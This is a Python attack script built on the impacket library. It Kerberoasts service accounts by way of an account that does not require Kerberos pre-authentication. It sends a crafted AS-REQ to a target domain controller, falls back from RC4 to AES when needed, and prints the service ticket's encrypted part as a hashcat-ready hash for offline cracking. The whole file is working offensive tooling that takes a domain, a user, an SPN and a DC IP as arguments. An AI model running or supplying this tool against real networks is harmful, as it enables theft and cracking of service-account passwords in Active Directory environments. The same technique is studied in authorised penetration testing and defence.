#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import argparse
import datetime
import warnings

# Ignoring deprecation warnings
warnings.filterwarnings("ignore", category=UserWarning, message=".*pkg_resources*")

from binascii import hexlify
from pyasn1.type.univ import noValue
from pyasn1.codec.der import encoder, decoder

from impacket import version
from impacket.krb5 import constants
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.ccache import CCache, Credential, Times, CountedOctetString
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter

def kerberoast(user, spn,  domain, dc_ip) -> str:

    # First constructing the AS-REQ message
    username = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    servername = Principal(f'{spn}', type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    # PAC request
    pac_request = KERB_PA_PAC_REQUEST()
    pac_request['include-pac'] = True
    encoded_pac_request = encoder.encode(pac_request)

    # Constructing the AS-REQ message
    auth_req = AS_REQ()

    # Setting the client principal
    auth_req['pvno'] = 5
    auth_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    """
    PDATA is not required for AS-REQ without pre-authentication.
    """

    # Creating request body
    request_body = seq_set(auth_req, 'req-body')

    # Set timestamps
    now = datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=1)
    request_body['nonce'] = random.getrandbits(31)
    request_body['rtime'] = KerberosTime.to_asn1(now)
    request_body['till'] = KerberosTime.to_asn1(now)

    opts = list()
    opts.append(constants.KDCOptions.forwardable.value)
    opts.append(constants.KDCOptions.renewable.value)
    opts.append(constants.KDCOptions.proxiable.value)
    request_body['kdc-options'] = constants.encodeFlags(opts)

    # Set the client principal
    seq_set(request_body, 'cname', username.components_to_asn1)
    seq_set(request_body, 'sname', servername.components_to_asn1)

    # Set realm
    request_body['realm'] = domain
    
    # Cipher suites
    supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
   
    seq_set_iter(request_body, 'etype', supported_ciphers)

    message = encoder.encode(auth_req)

    # Send the messge
    try:
        r = sendReceive(message, domain, dc_ip)
    except Exception as e:
        if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
            supported_ciphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)

            seq_set_iter(request_body, 'etype', supported_ciphers)
            message = encoder.encode(auth_req)
            r = sendReceive(message, domain, dc_ip)

        else:
            raise Exception(f'Error encoding AS-REQ: {str(e)}')

    try:
        asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
    except:
        asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
    else:
        # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
        print(f'[-] User {username} doesn\'t have UF_DONT_REQUIRE_PREAUTH set')
        return None

    # Parse the AS-REP
    asRep = decoder.decode(r, asn1Spec=AS_REP())[0]

    # Extract the encrypted part
    ciphered_part = asRep['enc-part']['cipher']

    # Check what type of encryption we have    
    hashcat_format = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
        constants.EncryptionTypes.rc4_hmac.value,
        spn,
        asRep["ticket"]["realm"],
        "DoesNotMatter",
        hexlify(asRep["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
        hexlify(asRep["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
    )

    return hashcat_format

def main():
    parser = argparse.ArgumentParser(description='Kerberoast service accounts using AS-REP roastable accounts')
    parser.add_argument('-u', '--user', required=True, help='Username that has UF_DONT_REQUIRE_PREAUTH set')
    parser.add_argument('-spn', '--spn', required=True, help='SPN to kerberoast. Format: samAccountName')
    parser.add_argument('-d', '--domain', required=True, help='Domain of the user')
    parser.add_argument('-dc-ip', '--dc-ip', required=True, help='IP address of the KDC')

    args = parser.parse_args()

    if not args.domain or not args.dc_ip or not args.user or not args.spn:
        parser.print_help()
        return

    if args.user and args.spn:
        roast = kerberoast(args.user, args.spn, args.domain, args.dc_ip)
        print(f"[i] Roasting Service Account: {args.spn}")
        print(f"[+] Kerberoast : {roast}")
   
    else:
        parser.print_help()
        return

if __name__ == '__main__':
    main()

